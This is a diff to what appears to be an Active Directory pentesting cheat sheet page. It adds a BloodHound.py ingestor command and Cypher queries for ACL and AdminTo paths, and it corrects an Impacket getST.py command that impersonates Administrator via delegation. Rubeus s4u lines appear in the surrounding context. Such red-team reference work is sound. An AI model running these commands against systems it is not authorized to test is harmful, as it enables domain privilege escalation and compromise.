@@ -827,6 +827,9 @@ Invoke-BloodHound<span class="w"> </span>-CollectionMethods<span class="w"> </sp
 </ul>
 <p>*Note 1: <code>Sharphound.ps1</code> is less likely to be blocked by AVs.
 *Note 2: When running <code>Sharphound.ps1</code> from memory, better specify the output directory with the <code>-OutputDirectory</code> parameter.</p>
+<p>Collect information for <code>Bloodhound</code> remotely with <a href="https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce">BloodHound.py Ingestor</a>:</p>
+<div class="highlight"><pre><span></span><code>bloodhound-ce-python<span class="w"> </span>--zip<span class="w"> </span>-c<span class="w"> </span>&lt;Methods&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;@&lt;domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-dc<span class="w"> </span>&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span><span class="o">[</span>-ns<span class="w"> </span>&lt;DNS<span class="w"> </span>server&gt;<span class="o">]</span>
+</code></pre></div>
 <p>References:</p>
 <ul>
 <li><a href="https://github.com/BloodHoundAD/SharpHound">Sharphound</a></li>
@@ -835,6 +838,9 @@ Invoke-BloodHound<span class="w"> </span>-CollectionMethods<span class="w"> </sp
 <p>Cool reference <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/">here</a>.</p>
 <p>Find instances where a computer has the "AdminTo" relationship over another computer:</p>
 <div class="highlight"><pre><span></span><code><span class="n">MATCH</span><span class="w"> </span><span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="n">c1</span><span class="o">:</span><span class="n">Computer</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="n">r1</span><span class="o">:</span><span class="n">MemberOf</span><span class="o">*</span><span class="mf">1.</span><span class="p">.]</span><span class="o">-&gt;</span><span class="p">(</span><span class="n">g</span><span class="o">:</span><span class="kr">Group</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="n">r2</span><span class="o">:</span><span class="n">AdminTo</span><span class="p">]</span><span class="o">-&gt;</span><span class="p">(</span><span class="n">n</span><span class="o">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="kr">RETURN</span><span class="w"> </span><span class="n">p</span>
+</code></pre></div>
+<p>Find users ACLs:</p>
+<div class="highlight"><pre><span></span><code><span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="nl">u</span><span class="p">:</span><span class="k">User</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="o">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
 </code></pre></div>
 <h2 id="lateral-movements_2">Lateral Movements</h2>
 <h3 id="pivoting">Pivoting</h3>
@@ -1424,7 +1430,7 @@ Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:<span clas
 Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/nowrap<span class="w"> </span>/impersonateuser:<span class="s2">"administrator"</span><span class="w"> </span>/msdsspn:<span class="s2">"host/&lt;target host&gt;"</span><span class="w"> </span>/altservice:cifs,ldap<span class="w"> </span>/domain:<span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>/user:<span class="s2">"&lt;controlled machine account&gt;</span>$<span class="s2">"</span><span class="w"> </span>/ticket:&lt;ticket<span class="w"> </span>from<span class="w"> </span>previous<span class="w"> </span>command&gt;
 </code></pre></div>
 <p>Request a Service Ticket with the controlled machine account on behalf of Administrator for the target machine remotely with Impacket's <code>getST</code>:</p>
-<div class="highlight"><pre><span></span><code>getST.py<span class="w"> </span>-spn<span class="w"> </span><span class="s1">'cifs/&lt;target host&gt;'</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span><span class="s1">'&lt;controlled machine account&gt;$/&lt;password&gt;'</span>
+<div class="highlight"><pre><span></span><code>getST.py<span class="w"> </span>-spn<span class="w"> </span><span class="s1">'cifs/&lt;target host&gt;'</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;/&lt;controlled machine account&gt;$:&lt;password&gt;'</span>
 </code></pre></div>
 <p>Use the resulting ticket in a <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#pass-the-attacks">Pass-the-Ticket</a> attack.</p>
 <p>Cleanup:</p>
